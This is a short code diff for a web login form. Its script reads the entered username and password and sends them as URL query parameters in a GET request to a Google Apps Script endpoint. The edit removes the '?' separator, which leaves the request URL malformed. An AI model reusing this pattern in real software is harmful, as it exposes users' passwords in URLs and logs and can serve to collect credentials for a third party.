@@ -29,7 +29,7 @@ document.addEventListener("DOMContentLoaded", function() {
         var username = document.getElementById("username").value;
         var password = document.getElementById("password").value;
 
-        fetch("https://script.google.com/macros/s/AKfycbz2smwIffnWhwqslX_mqj3zPXD7vzo3mChV3mXx2JQItWbl3czWowrXLYEWbHqZ6w/exec?" + 
+        fetch("https://script.google.com/macros/s/AKfycbz2smwIffnWhwqslX_mqj3zPXD7vzo3mChV3mXx2JQItWbl3czWowrXLYEWbHqZ6w/exec" + 
             new URLSearchParams({ username: username, password: password }), {
             method: "GET"
         })
